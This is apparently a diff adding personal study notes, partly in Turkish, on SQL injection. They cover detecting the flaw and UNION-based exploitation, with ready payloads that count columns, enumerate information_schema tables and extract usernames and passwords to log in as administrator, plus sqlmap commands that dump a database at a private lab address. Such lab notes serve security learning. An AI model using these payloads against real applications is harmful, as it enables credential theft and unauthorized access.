@@ -1,3 +1,170 @@
+
+
+
+select * from users order by 4; -> 2.sütuna göre alfetik olarak sıralar, fakat 3 tane sütun varsa hata verir, bizde bu şekilde 3 tane sütun olduğunu anlamış oluruz.
+
+select * username from users union select id, from emails; -> users tablosundaki username sütunu ile emails tablosundaki id sütununu birleştirir alt alta.
+
+
+
+						1# Detection of vulnerability
+
+Way #1:
+	Birinci sorgu ve sonucu
+		SELECT * FROM haberler WHERE id=1
+		<html>
+		MDISEC
+		</html>
+	İkinci sorgu ve sonucu
+		SELECT * FROM haberler WHERE id=2-1
+		<html>
+		MDISEC
+		</html>
+
+id kısmına 1 yazdığında gelen sonuç referans noktan 2 yazdığında sonuç değişiyor ve 2-1 yaptığında 1 ile aynı sonuç geliyorsa demekki zafiyet var.
+
+Way #2:
+
+query #1 : SELECT * FROM haberler WHERE id=1'
+response : 500 internal server error response code
+
+
+query #2 : SELECT * FROM haberler WHERE id=1'--
+response : 200 response code
+
+-------------------------------------------------------------------------------------------------
+						#2 Exploitation of weakness
+
+||||||||||||||||||||||||||||||||||||||||||||
+#UNION SQLi
+
+Goal -> Determine the number of the columns returned by the query.
+	Background :
+	table1		table2
+	a | b		c | d
+	-----		-----
+	1  2		2  3
+	3  4		4  5
+	Query #1: select a,b from table 1
+	1,2
+	3,4
+	Query #2: select a,b from table 1 UNION select c,d from table2
+	1,2
+	3,4
+	2,3
+	4,5
+	Rule:
+	- The number and the order of the columns must be the same in all queries
+	- The data types must be compatible
+	
+	SQLi Attack (way #1):
+	select ? from table1 UNION select NULL
+	-error -> incorrect number of columns
+	
+	select ? from table1 UNION select NULL,NULL,NULL
+	-200 response code -> correct number of columns
+	
+	' UNION SELECT NULL--
+	' UNION SELECT NULL,NULL--
+	' UNION SELECT NULL,NULL,NULL--
+	etc.
+	
+	Sqli attack (way #2):
+	select a,b from table1 order by 3
+	-error -> incorrect number of columns, there are 2 columns that a and b.
+	
+	' ORDER BY 1--
+	' ORDER BY 2--
+	' ORDER BY 3--
+	etc.
+
+
+Goal -> Finding columns with a useful data type
+
+	After you determine the number of columns, you can probe each column to test whether it can hold string data.
+	
+	' UNION SELECT 'a',NULL,NULL,NULL--
+	' UNION SELECT NULL,'a',NULL,NULL--
+	' UNION SELECT NULL,NULL,'a',NULL--
+	' UNION SELECT NULL,NULL,NULL,'a'--
+	
+	If the column data type is not compatible with string data, the injected query will cause a databese error, such as:
+	"Conversion failed when converting the varchar value 'a' to data type int."
+
+
+Goal -> Using a SQL injection UNION attack to retrieve interesting data
+
+	' UNION SELECT username, password FROM users--
+
+
+Goal -> Retrieving multiple values within a single column
+
+	1# find the number of columns that the vulnerable is using:
+	
+	' order by 1-- -> not displayed on the page
+	' order by 2-- -> displayed on the page
+	' order by 3-- -> internal server error
+	
+	2# Find which columns contain text
+	
+	' UNION SELECT 'a', NULL-- -> internal server error
+	' UNION SELECT NULL, 'a'-- -> 200 code response
+	
+	3# Output data from other tables
+	
+	' UNION SELECT NULL, username FROM users--
+	' UNION SELECT NULL, password FROM users--
+	OR
+	first learn the String Concatenation with version command:
+	' UNION SELECT NULL,username || '~' || password FROM users--
+	' UNION select NULL,username || password from users--
+
+
+
+Goal -> Output the content of the table
+
+	1# Find the number of columns
+	' order by 2--
+	
+	2# Find the data type of the columns
+	' UNION SELECT 'a', 'b'--
+	
+	3# Version of the database (To learn the database name)
+	' UNION SELECT 'a', version()--  (for example : PostgreSQL 12.20)
+	
+	4# Output the list of the table names in the database
+	SELECT * FROM information_schema.tables -> postgreSQL
+	' UNION SELECT table_name,NULL FROM information_schema.tables
+	users_aclxxp
+	
+	5# Output the list of the column names in the database
+	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' -> postgreSQL
+	' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_aclxxp'-- 
+	
+	6# Output the username and passwords
+	' UNION SELECT username, password FROM users--
+	
+	and login as a administrator.
+
+||||||||||||||||||||||||||||||||||||||||||||
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 🗲SqlMap
   #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
   #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
